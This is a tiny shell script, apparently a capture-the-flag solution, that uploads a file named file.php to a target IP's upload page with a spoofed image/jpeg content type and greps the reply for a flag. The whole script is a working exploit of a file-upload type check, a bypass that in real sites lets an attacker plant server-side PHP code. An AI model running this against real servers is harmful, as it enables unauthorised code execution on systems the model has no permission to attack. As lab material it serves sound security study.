#!/bin/sh
if [$1 = ""]; then
    echo "Usage: ./upload.sh ip"
    exit 1
fi
curl -X POST -F "uploaded=@./file.php;type=image/jpeg" http://$1/\?page\=upload -F "Upload=Upload" | grep flag